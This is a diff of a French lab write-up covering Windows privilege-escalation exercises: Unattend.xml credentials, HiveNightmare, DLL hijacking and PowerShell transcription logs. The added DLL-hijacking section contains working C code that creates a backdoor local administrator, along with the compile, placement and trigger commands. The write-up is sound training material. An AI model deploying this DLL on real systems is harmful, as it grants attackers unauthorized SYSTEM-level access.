@@ -2,9 +2,10 @@
 
 ## Vue d'Ensemble du Projet
 
-Ce laboratoire démontre trois techniques d'escalade de privilèges sur Windows :
+Ce laboratoire démontre quatre techniques d'escalade de privilèges sur Windows :
 - **Task 0** : Exploitation de fichiers d'installation automatisée (Unattend.xml) contenant des identifiants encodés en Base64
 - **Task 1** : Exploitation de la vulnérabilité HiveNightmare (CVE-2021-36934) pour extraire et cracker les hashes SAM/SYSTEM
+- **Task 2** : Détournement de DLL (DLL Hijacking) via des permissions faibles sur un répertoire de service
 - **Task 3** : Exploitation des journaux de transcription PowerShell pour extraire des secrets et reconstruire un flag par hachage MD5
 
 ---
@@ -14,6 +15,12 @@ Ce laboratoire démontre trois techniques d'escalade de privilèges sur Windows 
 ## Objectif
 
 Localiser des fichiers d'installation automatisée (Unattend.xml), extraire des identifiants administratifs encodés à l'aide de Python/Regex, et établir une session administrative pour récupérer un flag cible.
+
+## Contexte
+
+**Cible :** VM Windows (Task 0)  
+**Compte initial :** Utilisateur standard  
+**Fichiers clés :** `Unattend.xml`, `extract_password.py`, `flag.exe`
 
 ---
 
@@ -116,6 +123,8 @@ Password to type: Sup3erSecretPass4ADm1n
 
 Le laboratoire a été complété avec succès en exploitant des identifiants stockés de manière non sécurisée dans les fichiers de configuration Windows. Le flag final a été récupéré en exécutant `flag.exe` en tant que `SuperAdministrator`.
 
+**Artefact :** Flag sauvegardé dans `0-flag.txt`
+
 ### Leçons Apprises
 
 - Les fichiers d'installation automatisée peuvent contenir des informations sensibles
@@ -131,7 +140,9 @@ Le laboratoire a été complété avec succès en exploitant des identifiants st
 
 Exploiter une vulnérabilité du système pour récupérer le mot de passe du compte `superAdministrator` et récupérer le flag.
 
-**VM Cible :** LAB02  
+## Contexte
+
+**Cible :** LAB02  
 **Compte utilisé :** Sammy  
 **Mot de passe Sammy :** Sammy
 
@@ -157,7 +168,7 @@ Cela signifie que les utilisateurs standards ont des permissions de lecture sur 
 
 ## Étape 2 : Énumération des Privilèges (Optionnel)
 
-Télécharger et exécuter le script PowerShell **PrivCheck** sur le système cible pour identifier d'autres vulnérabilités potentielles.
+Télécharger et exécuter le script PowerShell **PrivescCheck** sur le système cible pour identifier d'autres vulnérabilités potentielles.
 
 **Analyse de la sortie :**
 - Confirmer la vulnérabilité HiveNightmare
@@ -299,6 +310,8 @@ C:\Users\superAdministrator\Desktop\flag.exe
 
 L'exploitation des fichiers de sauvegarde SAM et SYSTEM via la vulnérabilité HiveNightmare permet d'extraire les hashes de mots de passe, de les cracker, et d'obtenir un accès administrateur complet au système.
 
+**Artefact :** Flag sauvegardé dans `1-flag.txt`
+
 ### Leçons Apprises
 
 - La vulnérabilité HiveNightmare (CVE-2021-36934) permet aux utilisateurs standards d'accéder aux fichiers SAM/SYSTEM
@@ -310,11 +323,118 @@ L'exploitation des fichiers de sauvegarde SAM et SYSTEM via la vulnérabilité H
 
 ---
 
+# TASK 2 : DLL Hijacking via Weak Permissions
+
+## Objectif
+
+Exploiter un chargement de DLL non sécurisé pour obtenir une exécution de code en contexte `NT AUTHORITY\SYSTEM`, puis utiliser les privilèges obtenus pour récupérer le flag.
+
+## Contexte
+
+**Cible :** LAB03  
+**Compte utilisé :** Student  
+**Mot de passe Student :** Student  
+**Fichiers :** `malicious.c`, `SprintCSP.dll`, `WIN10RpcClient.exe`, `flag.exe`
+
+---
+
+## Étape 1 : Identification de la Vulnérabilité
+
+Le service `StorSvc` (Storage Service), exécuté en `SYSTEM`, tente de charger une DLL manquante (`SprintCSP.dll`) en suivant un ordre de recherche où un chemin est insécure.
+
+Le répertoire binaire d'une installation tierce (Confluence) possède des permissions trop permissives (`Write` pour le groupe `Users`), permettant d'y déposer une DLL malveillante.
+
+**Chemin vulnérable :**
+```text
+C:\Program Files\Atlassian\Confluence\bin\SprintCSP.dll
+```
+
+**Validation :**
+- L'exécution de `PrivescCheck.ps1 -Extended` remonte une vulnérabilité `High` dans `Services - Image File Permissions`
+- Le groupe `Users` peut écrire dans le dossier `\bin` utilisé par le service
+
+---
+
+## Étape 2 : Préparation de la DLL Malveillante (Kali Linux)
+
+Création d'un fichier C (`malicious.c`) exécuté au chargement de la DLL.
+
+**Code source :**
+```c
+#include <windows.h>
+#include <stdlib.h>
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+   if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+      system("net user hacker Password123! /add");
+      system("net localgroup administrators hacker /add");
+   }
+   return TRUE;
+}
+```
+
+**Compilation croisée :**
+```bash
+x86_64-w64-mingw32-gcc -shared -o SprintCSP.dll malicious.c
+```
+
+---
+
+## Étape 3 : Mise en Place et Déclenchement (Windows)
+
+**Transfert :** copier `SprintCSP.dll` depuis Kali vers la machine Windows cible.
+
+**Injection :**
+```powershell
+Copy-Item .\SprintCSP.dll "C:\Program Files\Atlassian\Confluence\bin\SprintCSP.dll" -Force
+```
+
+**Déclenchement :** forcer `StorSvc` à appeler la fonction RPC qui charge la DLL.
+```powershell
+.\WIN10RpcClient.exe
+```
+
+**Résultat :** la DLL est chargée par `SYSTEM`, le compte `hacker` est créé puis ajouté au groupe `Administrators`.
+
+---
+
+## Étape 4 : Phase Finale - Capture du Flag
+
+Approche directe via l'interface graphique avec les privilèges du compte `hacker`.
+
+- Ouvrir une session/commande avec les identifiants du compte `hacker`
+- Naviguer vers `C:\Users\superAdministrator\Desktop\`
+- Valider la demande UAC (`Continuer`) pour que Windows ajuste les ACL et autorise l'accès
+- Exécuter `flag.exe` depuis le bureau du `superAdministrator`
+
+---
+
+## Conclusion Task 2
+
+Le détournement de DLL a permis d'obtenir une exécution de code en contexte `SYSTEM` en abusant d'un répertoire insécurisé du service. La création d'un compte administrateur local a ensuite permis l'accès au bureau cible et la récupération du flag.
+
+**Artefact :** Flag sauvegardé dans `2-flag.txt`
+
+### Leçons Apprises
+
+- Les permissions faibles sur les chemins de binaires/services exposent à des attaques de DLL Hijacking
+- Une DLL manquante chargée par un service privilégié peut devenir un point d'exécution en `SYSTEM`
+- `PrivescCheck` permet d'identifier rapidement les mauvaises ACL exploitables
+- Les ACL/UAC peuvent être contournées après élévation locale réussie
+
+---
+
 # TASK 3 : Privilege Escalation via PowerShell Transcription Logs
 
 ## Objectif
 
 Identifier une vulnérabilité de configuration dans la journalisation PowerShell, extraire des secrets (passphrase et identifiants) à partir des fichiers de transcription, et reconstruire un flag généré dynamiquement via un algorithme de hachage MD5.
+
+## Contexte
+
+**Cible :** VM Windows (Task 3)  
+**Compte utilisé :** Student  
+**Fichiers clés :** Logs PowerShell de transcription, `flag.exe`
 
 ---
 
@@ -392,6 +512,8 @@ $flag = [System.BitConverter]::ToString($hash).Replace('-', '').ToLower()
 ## Conclusion Task 3
 
 L'analyse des journaux de transcription PowerShell permet de récupérer des secrets exposés par des sessions précédentes et de reconstituer un flag généré dynamiquement sans avoir besoin d'accéder directement à un compte privilégié.
+
+**Artefact :** Flag sauvegardé dans `3-flag.txt`
 
 ### Leçons Apprises
 
